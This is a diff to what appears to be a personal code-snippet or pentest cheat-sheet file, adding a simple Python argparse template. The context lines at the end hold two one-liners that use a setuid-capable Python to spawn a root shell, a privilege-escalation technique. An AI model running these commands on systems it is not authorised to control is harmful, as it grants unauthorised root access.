@@ -4848,6 +4848,29 @@ if __name__ == "__main__":
     main()
 
 
+# simple script with arguments
+## PY3
+#!/usr/bin/env python3
+import argparse
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description='my awesome script with args')
+
+    # example argument
+    parser.add_argument('--example', type=int, default=42, help='example argument with a default value 42')
+
+    args = parser.parse_args()
+    return args
+
+def main():
+    args = parse_arguments()
+    example_value = args.example
+    print(f"example argument value: {example_value}")
+
+if __name__ == "__main__":
+    main()
+
+
 # python with setuid capability? --> spawn root shell
 python -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
 python3 -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
